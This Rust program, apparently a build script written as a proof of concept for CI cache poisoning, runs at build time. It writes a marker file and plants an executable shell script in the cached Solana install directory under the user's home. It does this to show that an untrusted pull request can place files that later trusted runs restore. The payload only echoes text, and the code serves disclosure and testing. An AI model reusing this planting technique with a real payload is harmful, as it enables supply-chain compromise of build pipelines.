use std::{env, fs, path::Path};

#[cfg(unix)]
use std::os::unix::fs::PermissionsExt;

fn main() {
    // Write a harmless marker *inside the cached directory*
    let home = env::var("HOME").unwrap_or_default();
    let cache_root = format!("{home}/.local/share/solana/install");
    let marker_path = format!("{cache_root}/CACHE_POC_MARKER.txt");

    // Ensure dirs exist
    let _ = fs::create_dir_all(&cache_root);

    // Put an unmistakable marker
    let _ = fs::write(
        &marker_path,
        b"===CACHE_POC_MARKER===\nthis file proves the cache contents came from an untrusted PR.\n(no secrets, no network, non-destructive)\n",
    );

    // Optional: drop a no-op script in the cached tree to prove executables can be planted (still harmless)
    let scripts_dir = format!("{home}/.local/share/solana/install/active_release/bin");
    let _ = fs::create_dir_all(&scripts_dir);
    let planted = format!("{scripts_dir}/poc-cache-hello.sh");
    let _ = fs::write(
        &planted,
        b"#!/usr/bin/env bash\necho '===CACHE_POC_HELLO=== restored from cache (safe)'\n",
    );
    #[cfg(unix)]
    if let Ok(meta) = fs::metadata(&planted) {
        let mut perms = meta.permissions();
        perms.set_mode(0o755);
        let _ = fs::set_permissions(&planted, perms);
    }

    // Keep build passing (no panic). We don't print here to keep fork logs minimal.
}
